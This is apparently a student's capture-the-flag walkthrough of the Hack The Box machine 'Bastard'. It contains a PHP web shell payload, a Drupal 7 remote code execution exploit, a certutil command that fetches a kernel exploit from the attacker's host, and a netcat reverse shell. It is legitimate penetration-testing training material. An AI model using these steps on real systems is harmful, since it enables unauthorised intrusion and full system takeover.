ran an nmap scan and found ports 80, 135, and 49154 open

tried logging into the admin page and notice node?destination=node

tried fuffing it, no help here

noticed changelog.txt from our original nmap search

using searchsploit to find possible exploits

found a Drupal 7 remote code execution



using 41564.php
updated rest endpoint
also changed the data section to ask for a command prompt:
`<?php system($_REQUEST["cmd"]); ?>`

am able to traverse the directory using 
`http://bastard.htb/dixuSOspsOUU.php?cmd=dir%20\`
we are able to here traverse to 
`http://bastard.htb/dixuSOspsOUU.php?cmd=dir%20\Users\dimitris\Desktop`

we see user.txt and use:
`http://bastard.htb/dixuSOspsOUU.php?cmd=type%20\Users\dimitris\Desktop\user.txt`
user flag acquired

attempted to get into administrator but was unable to access the file
need to escalate privileges

found a windows kernel explloit named chimichurri.exe
[Chimchurri Link](https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe)

downloaded and will upload the file to our server

started an http server with
`sudo python3 -m http.server 8080'
now the http server is hosted with our current working directory

we go back to the site and upload the file using `certutil`
in the url we type
`http://bastard.htb/dixuSOspsOUU.php?cmd=certutil -urlcache -split -f http://10.10.14.20:8080/Chimichurri.exe`

we check if the file was uploaded with `dir`

now that the file is uploaded, we can netcat and hopefully get a reverse shell
`nc -nlvp 6666`
to finish off, we run the file
`http://bastard.htb/dixuSOspsOUU.php?cmd=Chimichurri.exe 10.10.14.20 6666`

we get the reverse shell and traverse to administrator's desktop for our root flag

# DONE